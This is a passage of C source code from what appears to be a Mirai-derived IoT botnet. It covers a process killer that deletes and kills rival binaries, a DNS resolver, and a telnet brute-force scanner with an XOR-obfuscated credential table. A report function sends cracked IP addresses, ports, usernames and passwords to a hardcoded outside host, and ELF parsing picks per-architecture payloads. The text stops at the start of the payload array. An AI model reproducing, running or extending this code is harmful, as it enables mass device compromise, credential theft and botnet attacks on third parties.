            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = (int) readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                table_unlock_val(TABLE_KILLER_ANIME);
                // If path contains ".anime" kill.
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    sockprintf(mainCommSock, "[killer] Process '%s' has deleted binary!\n", realpath);
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                sockprintf(mainCommSock, "[killer] Memory scan match for binary %s\n", exe_path);
                kill(pid, 9);
            }

            /*
            //upx scan was commented out
            if (upx_scan_match(exe_path, status_path))
            {
                sockprintf(mainCommSock, "[killer] UPX scan match for binary %s\n", exe_path);
                kill(pid, 9);
            }
            */


            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }
    sockprintf(mainCommSock, "[killer] Finished\n");
}
//////////////////////
/* Mirai Resolve    */
//////////////////////


void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (unsigned int) ((*reader) * 256 + *(reader + 1) - 49152);
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}

struct resolv_entries *resolv_lookup(char *domain) {
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = (uint16_t) (rand_next() % 0xffff);

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            sockprintf(mainCommSock, "[resolv] Failed to create socket\n");
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
            sockprintf(mainCommSock, "[resolv] Failed to call connect on udp socket\n");
            sleep(1);
            continue;
        }

        if (send(fd, query, (size_t) query_len, MSG_NOSIGNAL) == -1)
        {
            sockprintf(mainCommSock, "[resolv] Failed to send packet: %d\n", errno);
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
            sockprintf(mainCommSock, "[resolv] select() failed\n");
            break;
        }
        else if (nfds == 0)
        {
            sockprintf(mainCommSock, "[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
            sockprintf(mainCommSock, "[resolv] Got response from select\n");
            int ret = (int) recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0) {
                struct dns_resource *r_data = NULL;

                resolv_skip_name((uint8_t *) name, (uint8_t *) response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP)) {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = (uint8_t) name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
                        sockprintf(mainCommSock, "[resolv] Found IP address: %08x\n", (*p));
                    }

                    name = name + ntohs(r_data->data_len);
                }
                else {
                    resolv_skip_name((uint8_t *) name, (uint8_t *) response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);
    sockprintf(mainCommSock, "Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

//////////////////////
/* Mirai Scanlisten */
//////////////////////

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth) {
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        sockprintf(mainCommSock, "[report] Failed to call socket()\n");
        exit(0);
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(213,183,53,120);
    addr.sin_port = 48101;

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) {
        sockprintf(mainCommSock, "[report] Failed to connect to scanner callback!\n");
        close(fd);
        exit(0);
    }
    sockprintf(fd, "%s:%s %s:%s", daddr, dport, auth->username, auth->password);
    sockprintf(mainCommSock, "[report] Send scan result to loader\n");

    close(fd);
    exit(0);
}

//////////////////////

//////////////////////
/* Mirai Checksum   */
//////////////////////

uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t) ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length;
    length = len;

    while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
//////////////////////

//////////////////////
/* Telnet Scanner   */
//////////////////////


uint32_t fake_time = 0;
struct scanner_connection *conn_table;
int scanner_pid, rsck, rsck_out, auth_table_len = 0;
struct scanner_auth *auth_table = NULL;
uint16_t auth_table_max_weight = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};

static char *deobf(char *str, int *len) {
    int i;
    char *cpy;

    *len = util_strlen(str);

    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}


static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight) {
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static void setup_connection(struct scanner_connection *conn) {
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        sockprintf(mainCommSock, "[scanner] Failed to call socket()\n");
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static struct scanner_auth *random_auth_entry(void) {
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++) {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }
    return NULL;
}

int recv_strip_null(int sock, void *buf, int len, int flags) {
    int ret = (int) recv(sock, buf, (size_t) len, flags);

    if (ret > 0) {
        int i = 0;
        for(i = 0; i < ret; i++) {
            if (((char *)buf)[i] == 0x00) {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    return ret;
}

static BOOL can_consume(struct scanner_connection *conn, const uint8_t *ptr, int amount) {
    uint8_t *end = (uint8_t *) (conn->rdbuf + conn->rdbuf_pos);
    return ptr + amount < end;
}

static int consume_iacs(struct scanner_connection *conn) {
    int consumed = 0;
    uint8_t *ptr = (uint8_t *) conn->rdbuf;

    while (consumed < conn->rdbuf_pos) {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff) {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff) {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd) {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++) {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }
    return consumed;
}
static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%') {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1) {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn) {
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#') {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1) {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_any_prompt(struct scanner_connection *conn) {
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%') {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}
static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1) {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

struct payload {
    uint8_t bit;
    uint8_t endian;
    uint8_t machine;
    char *str;
    uint16_t len;
};

struct binary {
    char *str;
    uint8_t index;
};

enum {
    NUM_OF_PAYLOADS = 11,
    ENDIAN_LITTLE = 1,
    ENDIAN_BIG = 2,
    BIT_32 = 1,
    BIT_64 = 2,
    EM_NONE = 0,
    EM_SPARC = 2,
    EM_ARM = 40,
    EM_386 = 3,
    EM_68K = 4,
    EM_MIPS = 8,
    EM_PPC = 20,
    EM_X86_64 = 62,
    EM_SH = 42,
    EM_ARC = 93,
    MAX_ECHO_BYTES = 128,
};

static int parse_elf_response(struct scanner_connection *fd)
{
    int i = 0;
    char *elf_magic = "\x7f\x45\x4c\x46";
    int pos = 0;
    char *tmp;
    //thanosprint(uhmysockethere, "elf buf %s\n", fd->sock_buffer);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     

    for(i = 0; i < SOCK_BUFSIZE; i++)
    {
        if(fd->sock_buffer[i] == elf_magic[pos])
        {
            if(++pos == 4)
            {
                pos = i;
                break;
            }
        }
        else
        {
            pos = 0;
        }
    }

    if(pos == 0)
        return 0;
    //thanosprint(uhmysockethere, "got elf magic at position %d\n", pos);

    fd->bit = fd->sock_buffer[pos + 0x01];
    fd->endianness = fd->sock_buffer[pos + 0x02];
    fd->machine = fd->sock_buffer[pos + 0xF];
    

    if(fd->machine == EM_NONE)
        return 0;

    if(fd->machine == EM_ARM)
        tmp = "arm";
    else if(fd->machine == EM_SPARC)
        tmp = "sparc";
    else if(fd->machine == EM_386)
        tmp = "i686";
    else if(fd->machine == EM_68K)
        tmp = "m68k";
    else if(fd->machine == EM_PPC)
        tmp = "powerpc";
    else if(fd->machine == EM_ARC)
        tmp = "arc";
    else if(fd->machine == EM_SH)
        tmp = "superh";
    else if(fd->machine == EM_X86_64)
        tmp = "x86_64";
    else if(fd->machine == EM_MIPS && fd->endianness != ENDIAN_LITTLE)
        tmp = "mips";
    else if(fd->machine == EM_MIPS && fd->endianness == ENDIAN_LITTLE)
        tmp = "mipsel";
    else
        return FALSE;

    memcpy(fd->arch, tmp, strlen(tmp));
    return TRUE;
}

struct payload payloads[11] = {
    // arm
